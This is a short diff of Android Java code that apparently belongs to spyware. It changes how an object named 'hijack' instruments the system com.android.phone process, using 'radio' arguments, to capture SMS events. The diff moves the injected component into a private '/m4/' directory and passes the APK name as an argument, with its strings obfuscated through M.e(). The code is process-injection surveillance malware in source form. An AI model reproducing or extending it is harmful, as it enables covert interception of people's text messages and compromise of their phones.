@@ -66,8 +66,9 @@ public class LowEventHandlerSms extends Listener<LowEventSms> implements Observe
 	public void start() {
 		LowEventHandler.self().attach(this);
 		if(hijack == null) {
-			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName() + "@" + Status.getAppContext().getPackageName(), Status.self().semaphoreMediaserver, M.e("pa.data"), M.e("radio"));
+			hijack = new Instrument(M.e("com.android.phone"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, M.e("pa.data"), M.e("radio"));
 			hijack.setInstrumentationSuccessDir( Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"),true);
+			hijack.addArg(Status.getApkName());
 		}
 		hijack.start();
 	}
